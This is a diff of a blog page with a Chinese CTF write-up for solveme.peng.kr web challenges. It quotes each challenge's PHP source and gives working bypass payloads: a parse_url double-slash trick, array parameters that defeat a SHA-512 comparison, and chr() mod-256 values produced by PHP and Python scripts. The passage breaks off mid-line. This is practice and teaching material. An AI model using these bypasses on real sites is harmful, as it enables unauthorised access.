class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://wintersleep.solveme.peng.kr/?time=6e6</span><br></pre></td></tr></table></figure>
+<h2 id="web4-Hard-login"><a href="#web4-Hard-login" class="headerlink" title="web4:Hard login"></a>web4:Hard login</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/lib.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;hard_login_check&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Already logged in..&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]&#123;<span class="number">3</span>&#125;) || <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) != <span class="variable">$hidden_username</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Wrong username..&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]&#123;<span class="number">7</span>&#125;) || <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="variable">$hidden_password</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Wrong password..&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;hard_login_check&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Login success!&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ./&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
 <p>payload1: </p>
 <ul>
 <li>访问index.php抓包发包判断成功后跳转到index.php，但网页又会自动转到login.php，所以用burp截包即可</li>
 </ul>
-<p>payload2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://hardlogin.solveme.peng.kr/</span><br></pre></td></tr></table></figure></p>
-<h2 id="web5-URL-filtering"><a href="#web5-URL-filtering" class="headerlink" title="web5:URL filtering"></a>web5:URL filtering</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">"/lib.php"</span>;</span><br><span class="line"></span><br><span class="line">    $url = urldecode($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    $url_query = parse_url($url, PHP_URL_QUERY);</span><br><span class="line"></span><br><span class="line">    $params = explode(<span class="string">"&amp;"</span>, $url_query);</span><br><span class="line">    <span class="keyword">foreach</span>($params <span class="keyword">as</span> $param)&#123;</span><br><span class="line"></span><br><span class="line">        $idx_equal = strpos($param, <span class="string">"="</span>);</span><br><span class="line">        <span class="keyword">if</span>($idx_equal === <span class="keyword">false</span>)&#123;</span><br><span class="line">            $key = $param;</span><br><span class="line">            $value = <span class="string">""</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $key = substr($param, <span class="number">0</span>, $idx_equal);</span><br><span class="line">            $value = substr($param, $idx_equal + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strpos($key, <span class="string">"do_you_want_flag"</span>) !== <span class="keyword">false</span> || strpos($value, <span class="string">"yes"</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"no hack"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do_you_want_flag'</span>]) &amp;&amp; $_GET[<span class="string">'do_you_want_flag'</span>] == <span class="string">"yes"</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
-<p>看到过滤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strpos($key, <span class="string">"do_you_want_flag"</span>) !== <span class="keyword">false</span> || strpos($value, <span class="string">"yes"</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"no hack"</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
-<p>但是题目却要求我们使用do_you_want_flag=yes来获取flag</p>
+<p>payload2: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://hardlogin.solveme.peng.kr/</span><br></pre></td></tr></table></figure>
+<h2 id="web5-URL-filtering"><a href="#web5-URL-filtering" class="headerlink" title="web5:URL filtering"></a>web5:URL filtering</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&quot;/lib.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="variable">$url_query</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_QUERY);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$params</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;&amp;&quot;</span>, <span class="variable">$url_query</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$param</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$idx_equal</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$param</span>, <span class="string">&quot;=&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$idx_equal</span> === <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$key</span> = <span class="variable">$param</span>;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$param</span>, <span class="number">0</span>, <span class="variable">$idx_equal</span>);</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$param</span>, <span class="variable">$idx_equal</span> + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>, <span class="string">&quot;do_you_want_flag&quot;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$value</span>, <span class="string">&quot;yes&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do_you_want_flag&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;do_you_want_flag&#x27;</span>] == <span class="string">&quot;yes&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>看到过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>, <span class="string">&quot;do_you_want_flag&quot;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$value</span>, <span class="string">&quot;yes&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>但是题目却要求我们使用do_you_want_flag&#x3D;yes来获取flag</p>
 <p>显然相互矛盾，我们寻找漏洞点，发现url的解析工作有由parse_url()操作</p>
-<p>此时想到parse_url一个解析漏洞，参考一叶飘零师傅的<a href="http://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">文章</a></p>
-<p>在？前添加 / 会使pares_url函数返回false，这样可以绕过前面的判断会让parse_url返回false</p>
-<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://urlfiltering.solveme.peng.kr//?do_you_want_flag=yes</span><br></pre></td></tr></table></figure></p>
-<h2 id="web6-Hash-collison"><a href="#web6-Hash-collison" class="headerlink" title="web6:Hash collison"></a>web6:Hash collison</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'foo'</span>], $_GET[<span class="string">'bar'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strlen($_GET[<span class="string">'foo'</span>]) &gt; <span class="number">30</span> || strlen($_GET[<span class="string">'bar'</span>]) &gt; <span class="number">30</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Too long'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">'foo'</span>] === $_GET[<span class="string">'bar'</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Same value'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'foo'</span>]) !== hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'bar'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Different hash'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">``` </span><br><span class="line">可以看到要求我们用不同的值，并且sha512相等，所以想到数组绕过漏洞</span><br><span class="line"></span><br><span class="line">payload:</span><br></pre></td></tr></table></figure>
-<p><a href="http://hashcollision.solveme.peng.kr/?foo[]=1&amp;bar[]=2" target="_blank" rel="noopener">http://hashcollision.solveme.peng.kr/?foo[]=1&amp;bar[]=2</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## web7:Array2String</span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    $value = $_GET[&apos;value&apos;];</span><br><span class="line"></span><br><span class="line">    $username = $_GET[&apos;username&apos;];</span><br><span class="line">    $password = $_GET[&apos;password&apos;];</span><br><span class="line"></span><br><span class="line">    for ($i = 0; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">        if ($_GET[&apos;username&apos;]) unset($username);</span><br><span class="line">        if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);</span><br><span class="line">        else $username .= chr($value[$i]);</span><br><span class="line"></span><br><span class="line">        if ($username == &apos;15th_HackingCamp&apos; &amp;&amp; md5($password) == md5(file_get_contents(&apos;./secret.passwd&apos;))) &#123;</span><br><span class="line">            echo &apos;Hello &apos;.$username.&apos;!&apos;, &apos;&lt;br&gt;&apos;, PHP_EOL;</span><br><span class="line">            echo $flag, &apos;&lt;hr&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure></p>
-<p>由代码可知传入username和password两个变量，password可以通过访问./secret.passwd得到</p>
-<p> username==15th_HackingCamp 但是前面增加限制，在32-127之间，并且经过chr()函数的转义，经查阅chr函数有一个特性：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Note that if the number is higher than 256, it will return the number mod 256.</span><br><span class="line">For example :</span><br><span class="line">chr(321)=A because A=65(256)</span><br></pre></td></tr></table></figure>
-<p><a href="http://www.php.net/manual/zh/function.chr.php" target="_blank" rel="noopener">查阅文章</a><br>得知chr()会自动进行mod256,因此可写脚本：</p>
-<p>php脚本:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$username = <span class="string">'15th_HackingCamp'</span>;</span><br><span class="line">	$arr = str_split($username);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">foreach</span>($arr <span class="keyword">as</span> $value)&#123;</span><br><span class="line">		$value = ord($value) + <span class="number">256</span>;</span><br><span class="line">		$payload .= <span class="string">'value[]='</span> . $value . <span class="string">'&amp;'</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">echo</span> $payload .= <span class="string">'password=simple_passw0rd'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>生成最后的payload<br>    value[]=305&amp;value[]=309&amp;value[]=372&amp;value[]=360&amp;value[]=351&amp;value[]=328&amp;value[]=353&amp;value[]=355&amp;value[]=363&amp;value[]=361&amp;value[]=366&amp;value[]=359&amp;value[]=323&amp;value[]=353&amp;value[]=365&amp;value[]=368&amp;password=simple_passw0rd</p>
-<p>python脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ook</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://array2string.solveme.peng.kr/'</span></span><br><span class="line">    username_plaintext = <span class="string">'15th_HackingCamp'</span></span><br><span class="line">    mod_number = <span class="number">256</span></span><br><span class="line">    query_str = <span class="string">'?'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> username_plaintext:</span><br><span class="line">        c = ord(i) + mod_number</span><br><span class="line">        query_str += <span class="string">'value[]=%d&amp;'</span> % c</span><br><span class="line">    query_str += <span class="string">'password=simple_passw0rd'</span></span><br><span class="line">    <span class="keyword">print</span> requests.get(url + query_str).content</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ook()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'ok'</span></span><br></pre></td></tr></table></figure></p>
+<p>此时想到parse_url一个解析漏洞，参考一叶飘零师傅的<a target="_blank" rel="noopener" href="http://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/">文章</a></p>
+<p>在？前添加 &#x2F; 会使pares_url函数返回false，这样可以绕过前面的判断会让parse_url返回false</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://urlfiltering.solveme.peng.kr//?do_you_want_flag=yes</span><br></pre></td></tr></table></figure>
+<h2 id="web6-Hash-collison"><a href="#web6-Hash-collison" class="headerlink" title="web6:Hash collison"></a>web6:Hash collison</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/lib.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;foo&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;bar&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;foo&#x27;</span>]) &gt; <span class="number">30</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;bar&#x27;</span>]) &gt; <span class="number">30</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Too long&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;foo&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;bar&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Same value&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha512&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;foo&#x27;</span>]) !== <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha512&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;bar&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Different hash&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>, <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>可以看到要求我们用不同的值，并且sha512相等，所以想到数组绕过漏洞</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hashcollision.solveme.peng.kr/?foo[]=1&amp;bar[]=2</span><br></pre></td></tr></table></figure>
+
+<h2 id="web7-Array2String"><a href="#web7-Array2String" class="headerlink" title="web7:Array2String"></a>web7:Array2String</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/lib.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$value</span>); ++<span class="variable">$i</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">unset</span>(<span class="variable">$username</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$value</span>[<span class="variable">$i</span>] &gt; <span class="number">32</span> &amp;&amp; <span class="variable">$value</span>[<span class="variable">$i</span>] &lt; <span class="number">127</span>) <span class="keyword">unset</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="variable">$username</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$value</span>[<span class="variable">$i</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$username</span> == <span class="string">&#x27;15th_HackingCamp&#x27;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>) == <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./secret.passwd&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Hello &#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;&lt;br&gt;&#x27;</span>, PHP_EOL;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>, <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>由代码可知传入username和password两个变量，password可以通过访问.&#x2F;secret.passwd得到</p>
+<p> username&#x3D;&#x3D;15th_HackingCamp 但是前面增加限制，在32-127之间，并且经过chr()函数的转义，经查阅chr函数有一个特性：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Note that if the number is higher than 256, it will return the number mod 256.</span><br><span class="line">For example :</span><br><span class="line">chr(321)=A because A=65(256)</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="http://www.php.net/manual/zh/function.chr.php">查阅文章</a><br>得知chr()会自动进行mod256,因此可写脚本：</p>
+<p>php脚本:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$username</span> = <span class="string">&#x27;15th_HackingCamp&#x27;</span>;</span><br><span class="line">	<span class="variable">$arr</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$username</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$value</span>) + <span class="number">256</span>;</span><br><span class="line">		<span class="variable">$payload</span> .= <span class="string">&#x27;value[]=&#x27;</span> . <span class="variable">$value</span> . <span class="string">&#x27;&amp;&#x27;</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$payload</span> .= <span 